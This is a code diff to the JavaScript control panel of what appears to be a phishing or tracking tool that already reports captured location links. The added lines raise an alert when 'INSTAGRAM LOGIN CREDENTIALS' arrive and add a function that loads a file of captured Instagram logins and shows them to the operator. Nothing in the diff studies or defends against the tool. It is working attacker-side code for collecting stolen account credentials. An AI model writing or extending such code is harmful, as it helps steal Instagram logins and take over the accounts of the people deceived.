@@ -14,6 +14,10 @@ function Listener(){
             else if(data.includes("Google Map")){
                 show_notif("Google Map Link",data.slice(18),true)
             }
+            
+            else if(data.includes("INSTAGRAM LOGIN CREDENTIALS")){
+                show_notif("Instagram Login Captured",data.slice(0, 200) + "...",true)
+            }
 
             
 
@@ -185,3 +189,18 @@ $("#btn-clear").click(function(){
     $("#result").val("")
     old_data = ""
 })
+
+// View Instagram credentials function
+function viewInstagramCredentials() {
+    $.get("instagram_credentials.txt", function(data) {
+        if(data.trim() !== "") {
+            $("#result").val(data);
+            old_data = data;
+            show_notif("Instagram Credentials Loaded", "Credentials displayed in result area", true);
+        } else {
+            show_notif("No Instagram Credentials", "No Instagram credentials have been captured yet", false);
+        }
+    }).fail(function() {
+        show_notif("Error", "Could not load Instagram credentials file", false);
+    });
+}
